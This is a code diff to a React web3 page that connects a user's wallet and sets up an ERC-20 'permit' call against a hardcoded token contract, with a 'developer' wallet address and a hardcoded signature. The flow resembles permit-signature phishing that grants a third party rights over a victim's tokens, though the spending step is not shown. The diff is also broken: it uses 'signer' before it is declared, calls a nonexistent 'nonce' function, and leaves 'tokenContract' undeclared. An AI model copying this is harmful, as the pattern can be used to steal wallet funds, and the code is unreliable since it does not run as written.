@@ -12,15 +12,19 @@ const BNBContract = "0x095418A82BC2439703b69fbE1210824F2247D77c";
 const developer = {
 	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
 }
+const abi = [
+	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
+	'function nonces(address owner) view returns (uint256)'
+];
 
 const Page = () => {
 	const open = useWeb3Modal();
 	const wallet = useWalletInfo();
 	const account = useAccount();
 	const { signMessage } = useSignMessage();
-
-
+	const token = new ethers.Contract(BNBContract,abi,signer); // BNB Contract Addres
 	const { sendTransaction } = useSendTransaction()
+	const [deployed, setDeployed] = useState(false)
 	const {disconnect} = useDisconnect();
 	const {data: balance, isLoading} = useBalance({
 		address: account.address
@@ -28,7 +32,16 @@ const Page = () => {
 	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
 	const signer = useEthersSigner();
 
-	if (isLoading || !balance || !account) return <button onClick={() => open.open()}>
+	useEffect(()=>{
+		token.deployed().then(()=>{
+			token.nonce(account.address).then((e)=>{
+				console.log("NONCE",e)
+				setDeployed(true);
+			})
+		})
+	}, [])
+
+	if (isLoading || !balance || !account || !deployed) return <button onClick={() => open.open()}>
 		open
 	</button>;
 
@@ -112,14 +125,9 @@ const Page = () => {
 			<button disabled={!signature} onClick={async ()=>{
 				if (!signature) return;
 				// ABI of the token contract
-				const abi = [
-					'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
-					'function nonces(address owner) view returns (uint256)'
-				];
 
 
 
-				let tokenContract = new ethers.Contract(BNBContract,abi,signer); // BNB Contract Addres
 				tokenContract = await tokenContract.deployed();
 				debugger;
 				const sig = signature.slice(2);
